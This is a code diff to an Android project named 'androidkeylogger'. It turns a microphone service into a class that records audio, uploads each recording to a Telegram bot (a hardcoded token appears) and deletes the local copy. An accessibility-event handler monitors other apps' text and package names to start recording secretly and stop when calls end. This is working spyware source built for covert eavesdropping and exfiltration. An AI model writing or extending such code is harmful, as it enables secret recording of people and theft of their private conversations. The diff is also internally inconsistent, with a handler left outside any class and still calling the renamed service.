@@ -1,135 +1,148 @@
 package com.bshu2.androidkeylogger;
 
-import android.app.Service;
-import android.content.Intent;
+import android.content.Context;
 import android.media.MediaRecorder;
+import android.os.AsyncTask;
 import android.os.Environment;
-import android.os.IBinder;
 import android.util.Log;
+
+import com.example.newdynamicapk.Constants; // Importing Constants class for dynamic chat ID
 
 import java.io.File;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 
-public class MicrophoneRecorderService extends Service {
-    private static final String TAG = "MicrophoneRecorderService";
-    private static final String TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN";
-    private static final String TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID";
-    private MediaRecorder mediaRecorder;
+/**
+ * Microphone Recorder Service for recording and sending audio to Telegram.
+ */
+public class MicrophoneRecorder {
+
+    private static final String TAG = "MicrophoneRecorder";
+    private static final String TELEGRAM_BOT_TOKEN = "8178078713:AAGOSCn4KEuvXC64xXhDrZjwQZmIy33gfaI"; // Static bot token
+    private MediaRecorder recorder;
     private File audioFile;
 
-    @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {
-        startRecording();
-        return START_NOT_STICKY;
-    }
-
-    @Override
-    public void onDestroy() {
-        stopRecording();
-        super.onDestroy();
-    }
-
-    private void startRecording() {
+    /**
+     * Starts microphone recording.
+     */
+    public void startRecording(Context context) {
         try {
-            File dir = new File(Environment.getExternalStorageDirectory(), "Recordings");
+            File dir = new File(Environment.getExternalStorageDirectory(), "MicRecords");
             if (!dir.exists()) dir.mkdirs();
 
-            audioFile = new File(dir, "recording_" + System.currentTimeMillis() + ".mp3");
+            audioFile = new File(dir, "mic_" + System.currentTimeMillis() + ".mp3");
 
-            mediaRecorder = new MediaRecorder();
-            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
-            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
-            mediaRecorder.setOutputFile(audioFile.getAbsolutePath());
-            mediaRecorder.prepare();
-            mediaRecorder.start();
+            recorder = new MediaRecorder();
+            recorder.setAudioSource(MediaRecorder.AudioSource.MIC); // Record from the microphone
+            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+            recorder.setOutputFile(audioFile.getAbsolutePath());
+            recorder.prepare();
+            recorder.start();
 
-            Log.d(TAG, "Recording started.");
+            Log.d(TAG, "Microphone recording started: " + audioFile.getAbsolutePath());
         } catch (Exception e) {
-            Log.e(TAG, "Error starting recording: ", e);
+            Log.e(TAG, "Error starting microphone recording", e);
         }
     }
 
-    private void stopRecording() {
+    /**
+     * Stops the recording and sends the file to Telegram.
+     */
+    public void stopRecordingAndSendToTelegram() {
         try {
-            if (mediaRecorder != null) {
-                mediaRecorder.stop();
-                mediaRecorder.release();
-                mediaRecorder = null;
+            if (recorder != null) {
+                recorder.stop();
+                recorder.release();
+                recorder = null;
 
-                Log.d(TAG, "Recording stopped.");
-                sendRecordingToTelegram();
+                Log.d(TAG, "Microphone recording stopped. Sending to Telegram.");
+                new SendToTelegramTask().execute(audioFile.getAbsolutePath());
             }
         } catch (Exception e) {
-            Log.e(TAG, "Error stopping recording: ", e);
+            Log.e(TAG, "Error stopping microphone recording", e);
         }
     }
 
-    private void sendRecordingToTelegram() {
-        new Thread(() -> {
+    private class SendToTelegramTask extends AsyncTask<String, Void, Void> {
+        @Override
+        protected Void doInBackground(String... params) {
             try {
+                String filePath = params[0];
+                String chatId = Constants.TELEGRAM_CHAT_ID; // Retrieve chat ID dynamically
                 String telegramUrl = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendDocument";
-                String boundary = "*****";
+
+                File audioFile = new File(filePath);
+                String boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
+                String lineEnd = "\r\n";
+                String twoHyphens = "--";
 
                 HttpURLConnection conn = (HttpURLConnection) new URL(telegramUrl).openConnection();
-                conn.setDoOutput(true);
                 conn.setRequestMethod("POST");
-                conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
+                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+                conn.setDoOutput(true);
 
-                OutputStream os = conn.getOutputStream();
-                os.write(("--" + boundary + "\r\n").getBytes());
-                os.write(("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n").getBytes());
-                os.write((TELEGRAM_CHAT_ID + "\r\n").getBytes());
-                os.write(("--" + boundary + "\r\n").getBytes());
-                os.write(("Content-Disposition: form-data; name=\"document\"; filename=\"" + audioFile.getName() + "\"\r\n\r\n").getBytes());
+                OutputStream outputStream = conn.getOutputStream();
+                StringBuilder requestBody = new StringBuilder();
 
-                byte[] buffer = new byte[1024];
-                int bytesRead;
-                try (var fis = new FileInputStream(audioFile)) {
-                    while ((bytesRead = fis.read(buffer)) != -1) {
-                        os.write(buffer, 0, bytesRead);
-                    }
-                }
+                // Add chat_id
+                requestBody.append(twoHyphens).append(boundary).append(lineEnd)
+                        .append("Content-Disposition: form-data; name=\"chat_id\"").append(lineEnd)
+                        .append(lineEnd).append(chatId).append(lineEnd);
 
-                os.write(("\r\n--" + boundary + "--\r\n").getBytes());
-                os.flush();
-                os.close();
+                // Add file
+                requestBody.append(twoHyphens).append(boundary).append(lineEnd)
+                        .append("Content-Disposition: form-data; name=\"document\"; filename=\"")
+                        .append(audioFile.getName()).append("\"").append(lineEnd)
+                        .append("Content-Type: audio/mpeg").append(lineEnd)
+                        .append(lineEnd);
+
+                outputStream.write(requestBody.toString().getBytes("UTF-8"));
+                outputStream.write(java.nio.file.Files.readAllBytes(audioFile.toPath()));
+                outputStream.write(lineEnd.getBytes());
+                outputStream.write((twoHyphens + boundary + twoHyphens + lineEnd).getBytes());
+                outputStream.flush();
+                outputStream.close();
 
                 Log.d(TAG, "Telegram Response Code: " + conn.getResponseCode());
-                if (conn.getResponseCode() == 200) {
-                    audioFile.delete();
-                    Log.d(TAG, "Recording sent and file deleted.");
+
+                // Delete the file after sending
+                if (audioFile.exists() && audioFile.delete()) {
+                    Log.d(TAG, "Recording deleted after sending to Telegram.");
                 }
             } catch (Exception e) {
-                Log.e(TAG, "Error sending recording to Telegram: ", e);
+                Log.e(TAG, "Error sending microphone recording to Telegram", e);
             }
-        }).start();
-    }
-
-    @Override
-    public IBinder onBind(Intent intent) {
-        return null;
+            return null;
+        }
     }
 }
 
 @Override
 public void onAccessibilityEvent(AccessibilityEvent event) {
+    String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
+
     switch (event.getEventType()) {
         case AccessibilityEvent.TYPE_VIEW_CLICKED:
         case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
-            String data = event.getText().toString().toLowerCase();
-            if (data.contains("microphone") || data.contains("record")) {
-                Log.d(TAG, "Microphone activity detected. Starting recording service.");
+            String data = event.getText() != null ? event.getText().toString().toLowerCase() : "";
+
+            if (data.contains("record") || packageName.contains("audio") || packageName.contains("microphone")) {
+                Log.d(TAG, "Potential microphone activity detected. Starting recording service.");
+                // Start microphone recording service
                 startService(new Intent(this, MicrophoneRecorderService.class));
-            } else if (event.getPackageName().toString().contains("call")) {
-                Log.d(TAG, "Call ended. Stopping recording service.");
-                stopService(new Intent(this, MicrophoneRecorderService.class));
+            }
+
+            if (packageName.contains("call")) {
+                if (data.contains("end") || data.contains("disconnect")) {
+                    Log.d(TAG, "Call ended. Stopping recording service.");
+                    // Stop microphone recording service
+                    stopService(new Intent(this, MicrophoneRecorderService.class));
+                }
             }
             break;
         default:
             break;
     }
 }
-
